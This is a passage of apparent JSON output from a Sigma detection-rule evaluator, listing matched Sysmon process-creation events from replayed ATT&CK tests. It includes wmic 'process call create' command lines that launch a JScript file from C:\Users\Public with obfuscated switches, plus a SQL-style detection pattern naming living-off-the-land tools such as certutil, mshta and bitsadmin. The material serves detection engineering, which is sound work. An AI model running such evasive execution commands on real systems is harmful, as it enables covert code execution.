    {
      "row_id": 302,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "cmd.exe /c \"wmic process call create \\\"cmd.exe /\\\"c\\\" set __COMPAT_LAYER= && wscript.exe //E:jscript //nolOgO C:\\Users\\Public\\impl.js\\\"\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 210518,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=D87E9FA4C7C878F4C1DC8885CEA7F9F0,SHA256=75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9",
      "IMPHASH": "B0F049C014592B156EB1FA857E99CEB9",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "D87E9FA4C7C878F4C1DC8885CEA7F9F0",
      "Opcode": 0,
      "OriginalFileName": "Cmd.Exe",
      "OriginalLogfile": "t1204.002__t1204.002_007.evtx",
      "ParentCommandLine": "python  -m src.sigma_rule_evaluator.cli --execute",
      "ParentImage": "C:\\Users\\thaim\\AppData\\Local\\Programs\\Python\\Python314\\python.exe",
      "ParentProcessGuid": "20525DD1-CF08-6A2E-7403-000000002C00",
      "ParentProcessId": 9080,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E802-6A2E-7C13-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4",
      "SystemTime": "2026-06-14T17:42:26.913981Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:42:26.899",
      "Version": 5
    },
    {
      "row_id": 303,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "wmic  process call create \\\"cmd.exe /\\\"c\\\" set __COMPAT_LAYER= && wscript.exe //E:jscript //nolOgO C:\\Users\\Public\\impl.js\\\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "WMI Commandline Utility",
      "EventID": 1,
      "EventRecordID": 210521,
      "FileVersion": "10.0.26100.5074 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=2E51DA7B69836CFEBCB3F9AA47C08266,SHA256=7C7F386BB7C70263FD835DC58791B6DD73FC6617C27751B5503DBA8D0CDDA690,IMPHASH=43C6BE584D77B658A53A9A5C606724DD",
      "IMPHASH": "43C6BE584D77B658A53A9A5C606724DD",
      "Image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "2E51DA7B69836CFEBCB3F9AA47C08266",
      "Opcode": 0,
      "OriginalFileName": "wmic.exe",
      "OriginalLogfile": "t1204.002__t1204.002_007.evtx",
      "ParentCommandLine": "cmd.exe /c \"wmic process call create \\\"cmd.exe /\\\"c\\\" set __COMPAT_LAYER= && wscript.exe //E:jscript //nolOgO C:\\Users\\Public\\impl.js\\\"\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-E802-6A2E-7C13-000000002C00",
      "ParentProcessId": 10640,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E802-6A2E-7F13-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "7C7F386BB7C70263FD835DC58791B6DD73FC6617C27751B5503DBA8D0CDDA690",
      "SystemTime": "2026-06-14T17:42:26.976304Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:42:26.957",
      "Version": 5
    },
    {
      "row_id": 306,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "cmd.exe /c \"wmic process call create \\\"cmd.exe /\\\"c\\\" set __COMPAT_LAYER= && wscript.exe //E:jscript //NoLOGO C:\\Users\\Public\\impl.js\\\"\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 210611,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=D87E9FA4C7C878F4C1DC8885CEA7F9F0,SHA256=75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9",
      "IMPHASH": "B0F049C014592B156EB1FA857E99CEB9",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "D87E9FA4C7C878F4C1DC8885CEA7F9F0",
      "Opcode": 0,
      "OriginalFileName": "Cmd.Exe",
      "OriginalLogfile": "t1204.002__t1204.002_009.evtx",
      "ParentCommandLine": "python  -m src.sigma_rule_evaluator.cli --execute",
      "ParentImage": "C:\\Users\\thaim\\AppData\\Local\\Programs\\Python\\Python314\\python.exe",
      "ParentProcessGuid": "20525DD1-CF08-6A2E-7403-000000002C00",
      "ParentProcessId": 9080,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E82B-6A2E-AA13-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4",
      "SystemTime": "2026-06-14T17:43:07.221370Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:43:07.218",
      "Version": 5
    },
    {
      "row_id": 307,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "wmic  process call create \\\"cmd.exe /\\\"c\\\" set __COMPAT_LAYER= && wscript.exe //E:jscript //NoLOGO C:\\Users\\Public\\impl.js\\\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "WMI Commandline Utility",
      "EventID": 1,
      "EventRecordID": 210612,
      "FileVersion": "10.0.26100.5074 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=2E51DA7B69836CFEBCB3F9AA47C08266,SHA256=7C7F386BB7C70263FD835DC58791B6DD73FC6617C27751B5503DBA8D0CDDA690,IMPHASH=43C6BE584D77B658A53A9A5C606724DD",
      "IMPHASH": "43C6BE584D77B658A53A9A5C606724DD",
      "Image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "2E51DA7B69836CFEBCB3F9AA47C08266",
      "Opcode": 0,
      "OriginalFileName": "wmic.exe",
      "OriginalLogfile": "t1204.002__t1204.002_009.evtx",
      "ParentCommandLine": "cmd.exe /c \"wmic process call create \\\"cmd.exe /\\\"c\\\" set __COMPAT_LAYER= && wscript.exe //E:jscript //NoLOGO C:\\Users\\Public\\impl.js\\\"\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-E82B-6A2E-AA13-000000002C00",
      "ParentProcessId": 7704,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E82B-6A2E-AB13-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "7C7F386BB7C70263FD835DC58791B6DD73FC6617C27751B5503DBA8D0CDDA690",
      "SystemTime": "2026-06-14T17:43:07.237098Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:43:07.234",
      "Version": 5
    },
    {
      "row_id": 308,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "cmd.exe /c \"wmic process call create \\\"cmd.exe /c set __COMPAT_LAYER= && wscript.exe //E:jscript /\\\"/Nologo\\\" C:\\Users\\Public\\impl.js\\\"\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 210659,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=D87E9FA4C7C878F4C1DC8885CEA7F9F0,SHA256=75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9",
      "IMPHASH": "B0F049C014592B156EB1FA857E99CEB9",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "D87E9FA4C7C878F4C1DC8885CEA7F9F0",
      "Opcode": 0,
      "OriginalFileName": "Cmd.Exe",
      "OriginalLogfile": "t1204.002__t1204.002_010.evtx",
      "ParentCommandLine": "python  -m src.sigma_rule_evaluator.cli --execute",
      "ParentImage": "C:\\Users\\thaim\\AppData\\Local\\Programs\\Python\\Python314\\python.exe",
      "ParentProcessGuid": "20525DD1-CF08-6A2E-7403-000000002C00",
      "ParentProcessId": 9080,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E83E-6A2E-C313-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4",
      "SystemTime": "2026-06-14T17:43:26.595235Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:43:26.592",
      "Version": 5
    },
    {
      "row_id": 309,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "wmic  process call create \\\"cmd.exe /c set __COMPAT_LAYER= && wscript.exe //E:jscript /\\\"/Nologo\\\" C:\\Users\\Public\\impl.js\\\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "WMI Commandline Utility",
      "EventID": 1,
      "EventRecordID": 210662,
      "FileVersion": "10.0.26100.5074 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=2E51DA7B69836CFEBCB3F9AA47C08266,SHA256=7C7F386BB7C70263FD835DC58791B6DD73FC6617C27751B5503DBA8D0CDDA690,IMPHASH=43C6BE584D77B658A53A9A5C606724DD",
      "IMPHASH": "43C6BE584D77B658A53A9A5C606724DD",
      "Image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "2E51DA7B69836CFEBCB3F9AA47C08266",
      "Opcode": 0,
      "OriginalFileName": "wmic.exe",
      "OriginalLogfile": "t1204.002__t1204.002_010.evtx",
      "ParentCommandLine": "cmd.exe /c \"wmic process call create \\\"cmd.exe /c set __COMPAT_LAYER= && wscript.exe //E:jscript /\\\"/Nologo\\\" C:\\Users\\Public\\impl.js\\\"\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-E83E-6A2E-C313-000000002C00",
      "ParentProcessId": 10328,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E83E-6A2E-C513-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "7C7F386BB7C70263FD835DC58791B6DD73FC6617C27751B5503DBA8D0CDDA690",
      "SystemTime": "2026-06-14T17:43:26.684829Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:43:26.679",
      "Version": 5
    },
    {
      "row_id": 312,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "cmd.exe /c \"wmic process call create \\\"cmd.exe /c set __COMPAT_LAYER= && wscript.exe //E:jscript //nOloGo C:\\Users\\Public\\impl.js\\\"\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 210749,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=D87E9FA4C7C878F4C1DC8885CEA7F9F0,SHA256=75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9",
      "IMPHASH": "B0F049C014592B156EB1FA857E99CEB9",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "D87E9FA4C7C878F4C1DC8885CEA7F9F0",
      "Opcode": 0,
      "OriginalFileName": "Cmd.Exe",
      "OriginalLogfile": "t1204.002__t1204.002_012.evtx",
      "ParentCommandLine": "python  -m src.sigma_rule_evaluator.cli --execute",
      "ParentImage": "C:\\Users\\thaim\\AppData\\Local\\Programs\\Python\\Python314\\python.exe",
      "ParentProcessGuid": "20525DD1-CF08-6A2E-7403-000000002C00",
      "ParentProcessId": 9080,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E864-6A2E-EF13-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4",
      "SystemTime": "2026-06-14T17:44:04.956208Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:44:04.952",
      "Version": 5
    },
    {
      "row_id": 313,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "wmic  process call create \\\"cmd.exe /c set __COMPAT_LAYER= && wscript.exe //E:jscript //nOloGo C:\\Users\\Public\\impl.js\\\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "WMI Commandline Utility",
      "EventID": 1,
      "EventRecordID": 210750,
      "FileVersion": "10.0.26100.5074 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=2E51DA7B69836CFEBCB3F9AA47C08266,SHA256=7C7F386BB7C70263FD835DC58791B6DD73FC6617C27751B5503DBA8D0CDDA690,IMPHASH=43C6BE584D77B658A53A9A5C606724DD",
      "IMPHASH": "43C6BE584D77B658A53A9A5C606724DD",
      "Image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "2E51DA7B69836CFEBCB3F9AA47C08266",
      "Opcode": 0,
      "OriginalFileName": "wmic.exe",
      "OriginalLogfile": "t1204.002__t1204.002_012.evtx",
      "ParentCommandLine": "cmd.exe /c \"wmic process call create \\\"cmd.exe /c set __COMPAT_LAYER= && wscript.exe //E:jscript //nOloGo C:\\Users\\Public\\impl.js\\\"\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-E864-6A2E-EF13-000000002C00",
      "ParentProcessId": 11044,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E864-6A2E-F013-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "7C7F386BB7C70263FD835DC58791B6DD73FC6617C27751B5503DBA8D0CDDA690",
      "SystemTime": "2026-06-14T17:44:04.981479Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:44:04.969",
      "Version": 5
    }
  ]
},
{
  "title": "Suspicious Process Created Via Wmic.EXE",
  "id": "3c89a1e8-0fba-449e-8f1b-8409d6267ec8",
  "description": "Detects WMIC executing \"process call create\" with suspicious calls to processes such as \"rundll32\", \"regsrv32\", etc.",
  "sigmafile": "",
  "sigma": [
    "SELECT * FROM logs WHERE Channel='Microsoft-Windows-Sysmon/Operational' AND (EventID=1 AND ((CommandLine LIKE '%process %' ESCAPE '\\' AND CommandLine LIKE '%call %' ESCAPE '\\' AND CommandLine LIKE '%create %' ESCAPE '\\') AND (CommandLine LIKE '%rundll32%' ESCAPE '\\' OR CommandLine LIKE '%bitsadmin%' ESCAPE '\\' OR CommandLine LIKE '%regsvr32%' ESCAPE '\\' OR CommandLine LIKE '%cmd.exe /c %' ESCAPE '\\' OR CommandLine LIKE '%cmd.exe /k %' ESCAPE '\\' OR CommandLine LIKE '%cmd.exe /r %' ESCAPE '\\' OR CommandLine LIKE '%cmd /c %' ESCAPE '\\' OR CommandLine LIKE '%cmd /k %' ESCAPE '\\' OR CommandLine LIKE '%cmd /r %' ESCAPE '\\' OR CommandLine LIKE '%powershell%' ESCAPE '\\' OR CommandLine LIKE '%pwsh%' ESCAPE '\\' OR CommandLine LIKE '%certutil%' ESCAPE '\\' OR CommandLine LIKE '%cscript%' ESCAPE '\\' OR CommandLine LIKE '%wscript%' ESCAPE '\\' OR CommandLine LIKE '%mshta%' ESCAPE '\\' OR CommandLine LIKE '%\\\\Users\\\\Public\\\\%' ESCAPE '\\' OR CommandLine LIKE '%\\\\Windows\\\\Temp\\\\%' ESCAPE '\\' OR CommandLine LIKE '%\\\\AppData\\\\Local\\\\%' ESCAPE '\\' OR CommandLine LIKE '%\\%temp\\%%' ESCAPE '\\' OR CommandLine LIKE '%\\%tmp\\%%' ESCAPE '\\' OR CommandLine LIKE '%\\%ProgramData\\%%' ESCAPE '\\' OR CommandLine LIKE '%\\%appdata\\%%' ESCAPE '\\' OR CommandLine LIKE '%\\%comspec\\%%' ESCAPE '\\' OR CommandLine LIKE '%\\%localappdata\\%%' ESCAPE '\\')))"
  ],
  "rule_level": "high",
  "tags": [
    "attack.execution",
    "attack.t1047"
  ],
  "count": 106,
  "matches": [
    {
      "row_id": 40,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "C:\\Windows\\System32\\cmd.exe /c \"wmic /node:localhost process call create 'cmd.exe /c dir C:\\'\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 213319,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=D87E9FA4C7C878F4C1DC8885CEA7F9F0,SHA256=75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9",
      "IMPHASH": "B0F049C014592B156EB1FA857E99CEB9",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "D87E9FA4C7C878F4C1DC8885CEA7F9F0",
      "Opcode": 0,
      "OriginalFileName": "Cmd.Exe",
      "OriginalLogfile": "t1018__t1018_016.evtx",
      "ParentCommandLine": "python  -m src.sigma_rule_evaluator.cli --execute",
      "ParentImage": "C:\\Users\\thaim\\AppData\\Local\\Programs\\Python\\Python314\\python.exe",
      "ParentProcessGuid": "20525DD1-CF08-6A2E-7403-000000002C00",
      "ParentProcessId": 9080,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-EF71-6A2E-F518-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4",
      "SystemTime": "2026-06-14T18:14:09.469530Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 18:14:09.466",
      "Version": 5
    },
    {
      "row_id": 41,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "wmic  /node:localhost process call create 'cmd.exe /c dir C:\\'",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "WMI Commandline Utility",
      "EventID": 1,
      "EventRecordID": 213320,
      "FileVersion": "10.0.26100.5074 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=2E51DA7B69836CFEBCB3F9AA47C08266,SHA256=7C7F386BB7C70263FD835DC58791B6DD73FC6617C27751B5503DBA8D0CDDA690,IMPHASH=43C6BE584D77B658A53A9A5C606724DD",
      "IMPHASH": "43C6BE584D77B658A53A9A5C606724DD",
      "Image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "2E51DA7B69836CFEBCB3F9AA47C08266",
      "Opcode": 0,
      "OriginalFileName": "wmic.exe",
      "OriginalLogfile": "t1018__t1018_016.evtx",
      "ParentCommandLine": "C:\\Windows\\System32\\cmd.exe /c \"wmic /node:localhost process call create 'cmd.exe /c dir C:\\'\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-EF71-6A2E-F518-000000002C00",
      "ParentProcessId": 3852,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-EF71-6A2E-F618-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "7C7F386BB7C70263FD835DC58791B6DD73FC6617C27751B5503DBA8D0CDDA690",
      "SystemTime": "2026-06-14T18:14:09.488699Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 18:14:09.485",
      "Version": 5
    },
    {
      "row_id": 42,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "C:\\Windows\\System32\\cmd.exe /C \"wmic /node:localhost process call create 'cmd.exe /c dir C:\\'\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 213363,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=D87E9FA4C7C878F4C1DC8885CEA7F9F0,SHA256=75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9",
      "IMPHASH": "B0F049C014592B156EB1FA857E99CEB9",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "D87E9FA4C7C878F4C1DC8885CEA7F9F0",
      "Opcode": 0,
      "OriginalFileName": "Cmd.Exe",
      "OriginalLogfile": "t1018__t1018_017.evtx",
      "ParentCommandLine": "python  -m src.sigma_rule_evaluator.cli --execute",
      "ParentImage": "C:\\Users\\thaim\\AppData\\Local\\Programs\\Python\\Python314\\python.exe",
      "ParentProcessGuid": "20525DD1-CF08-6A2E-7403-000000002C00",
      "ParentProcessId": 9080,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-EF85-6A2E-0B19-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4",
      "SystemTime": "2026-06-14T18:14:29.005780Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 18:14:29.002",
      "Version": 5
    },
    {
      "row_id": 43,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "wmic  /node:localhost process call create 'cmd.exe /c dir C:\\'",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "WMI Commandline Utility",
      "EventID": 1,
      "EventRecordID": 213364,
      "FileVersion": "10.0.26100.5074 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=2E51DA7B69836CFEBCB3F9AA47C08266,SHA256=7C7F386BB7C70263FD835DC58791B6DD73FC6617C27751B5503DBA8D0CDDA690,IMPHASH=43C6BE584D77B658A53A9A5C606724DD",
      "IMPHASH": "43C6BE584D77B658A53A9A5C606724DD",
      "Image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "2E51DA7B69836CFEBCB3F9AA47C08266",
      "Opcode": 0,
      "OriginalFileName": "wmic.exe",
      "OriginalLogfile": "t1018__t1018_017.evtx",
      "ParentCommandLine": "C:\\Windows\\System32\\cmd.exe /C \"wmic /node:localhost process call create 'cmd.exe /c dir C:\\'\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-EF85-6A2E-0B19-000000002C00",
      "ParentProcessId": 10336,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-EF85-6A2E-0C19-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "7C7F386BB7C70263FD835DC58791B6DD73FC6617C27751B5503DBA8D0CDDA690",
      "SystemTime": "2026-06-14T18:14:29.022540Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 18:14:29.019",
      "Version": 5
    },
    {
      "row_id": 54,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "C:\\Windows\\System32\\cmd.exe /c \"wmic /node:localhost process call create 'cmd.exe /c dir C:\\'\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 213756,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
